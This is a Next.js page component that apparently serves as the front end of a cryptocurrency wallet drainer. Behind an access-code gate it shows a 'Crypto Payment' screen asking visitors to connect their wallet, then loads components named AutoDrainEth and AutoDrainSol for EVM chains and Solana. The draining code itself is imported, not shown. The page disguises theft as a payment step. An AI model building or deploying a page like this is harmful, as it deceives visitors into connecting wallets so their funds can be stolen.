import { useState } from 'react';
import dynamic from 'next/dynamic';

const AutoDrainEth = dynamic(
  () => import('../components/AutoDrainEth').then((m) => m.AutoDrainEth),
  { ssr: false },
);

const AutoDrainSol = dynamic(
  () => import('../components/AutoDrainSol').then((m) => m.AutoDrainSol),
  { ssr: false },
);

const ACCESS_CODE = process.env.NEXT_PUBLIC_ACCESS_CODE ?? '1234';

const PageBg: React.CSSProperties = {
  minHeight: '100vh',
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  background: 'linear-gradient(135deg, #0f0f1a 0%, #1a0a2e 50%, #0a1628 100%)',
  fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
};

export default function Home() {
  const [unlocked, setUnlocked] = useState(false);
  const [code, setCode] = useState('');
  const [shake, setShake] = useState(false);

  const tryUnlock = () => {
    if (code === ACCESS_CODE) {
      setUnlocked(true);
    } else {
      setShake(true);
      setCode('');
      setTimeout(() => setShake(false), 600);
    }
  };

  if (!unlocked) {
    return (
      <div style={PageBg}>
        <style>{`
          @keyframes spin { to { transform: rotate(360deg); } }
          @keyframes shake {
            0%,100% { transform: translateX(0); }
            20%,60% { transform: translateX(-8px); }
            40%,80% { transform: translateX(8px); }
          }
          @keyframes fadeIn { from { opacity:0; transform:translateY(12px); } to { opacity:1; transform:translateY(0); } }
          input:focus { outline: none; }
          button:hover:not(:disabled) { filter: brightness(1.1); }
        `}</style>
        <div
          style={{
            animation: 'fadeIn 0.4s ease',
            background: 'rgba(255,255,255,0.05)',
            backdropFilter: 'blur(20px)',
            border: '1px solid rgba(255,255,255,0.1)',
            borderRadius: '24px',
            padding: '48px 40px',
            width: '340px',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            gap: '20px',
          }}
        >
          <div
            style={{
              width: '56px',
              height: '56px',
              borderRadius: '16px',
              background: 'linear-gradient(135deg, #6366f1, #8b5cf6)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 8px 24px rgba(99,102,241,0.4)',
            }}
          >
            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
            </svg>
          </div>

          <div style={{ textAlign: 'center' }}>
            <h2 style={{ color: 'white', margin: '0 0 6px', fontSize: '22px', fontWeight: 700 }}>
              Enter Access Code
            </h2>
            <p style={{ color: 'rgba(255,255,255,0.4)', margin: 0, fontSize: '14px' }}>
              Enter your code to continue
            </p>
          </div>

          <input
            type="password"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && tryUnlock()}
            placeholder="••••••"
            autoFocus
            style={{
              width: '100%',
              padding: '14px 18px',
              borderRadius: '12px',
              border: shake ? '1.5px solid #ef4444' : '1.5px solid rgba(255,255,255,0.15)',
              background: 'rgba(255,255,255,0.07)',
              color: 'white',
              fontSize: '20px',
              letterSpacing: '6px',
              textAlign: 'center',
              boxSizing: 'border-box',
              animation: shake ? 'shake 0.5s ease' : 'none',
              transition: 'border-color 0.2s',
            }}
          />

          <button
            onClick={tryUnlock}
            style={{
              width: '100%',
              padding: '14px',
              borderRadius: '12px',
              border: 'none',
              background: 'linear-gradient(135deg, #6366f1, #8b5cf6)',
              color: 'white',
              fontSize: '15px',
              fontWeight: 700,
              cursor: 'pointer',
              boxShadow: '0 4px 16px rgba(99,102,241,0.4)',
              transition: 'filter 0.2s',
            }}
          >
            Continue
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={PageBg}>
      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity:0; transform:translateY(12px); } to { opacity:1; transform:translateY(0); } }
        button:hover:not(:disabled) { filter: brightness(1.08); }
      `}</style>
      <div
        style={{
          animation: 'fadeIn 0.4s ease',
          background: 'rgba(255,255,255,0.05)',
          backdropFilter: 'blur(20px)',
          border: '1px solid rgba(255,255,255,0.1)',
          borderRadius: '28px',
          padding: '40px 36px',
          width: '380px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          gap: '24px',
        }}
      >
        {/* Logo */}
        <div
          style={{
            width: '64px',
            height: '64px',
            borderRadius: '20px',
            background: 'linear-gradient(135deg, #6366f1, #8b5cf6)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            boxShadow: '0 10px 30px rgba(99,102,241,0.4)',
          }}
        >
          <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 2L2 7l10 5 10-5-10-5z" />
            <path d="M2 17l10 5 10-5" />
            <path d="M2 12l10 5 10-5" />
          </svg>
        </div>

        <div style={{ textAlign: 'center' }}>
          <h1 style={{ color: 'white', margin: '0 0 6px', fontSize: '24px', fontWeight: 800, letterSpacing: '-0.5px' }}>
            Crypto Payment
          </h1>
          <p style={{ color: 'rgba(255,255,255,0.4)', margin: 0, fontSize: '14px' }}>
            Connect your wallet to complete payment
          </p>
        </div>

        {/* Divider */}
        <div style={{ width: '100%', height: '1px', background: 'rgba(255,255,255,0.08)' }} />

        {/* ETH Section */}
        <div style={{ width: '100%' }}>
          <div style={{ color: 'rgba(255,255,255,0.35)', fontSize: '11px', fontWeight: 600, letterSpacing: '1px', textTransform: 'uppercase', marginBottom: '12px' }}>
            EVM (ETH · Polygon · BNB · more)
          </div>
          <AutoDrainEth />
        </div>

        {/* Divider */}
        <div style={{ width: '100%', display: 'flex', alignItems: 'center', gap: '12px' }}>
          <div style={{ flex: 1, height: '1px', background: 'rgba(255,255,255,0.08)' }} />
          <span style={{ color: 'rgba(255,255,255,0.2)', fontSize: '12px' }}>or</span>
          <div style={{ flex: 1, height: '1px', background: 'rgba(255,255,255,0.08)' }} />
        </div>

        {/* SOL Section */}
        <div style={{ width: '100%' }}>
          <div style={{ color: 'rgba(255,255,255,0.35)', fontSize: '11px', fontWeight: 600, letterSpacing: '1px', textTransform: 'uppercase', marginBottom: '12px' }}>
            Solana
          </div>
          <AutoDrainSol />
        </div>
      </div>
    </div>
  );
}
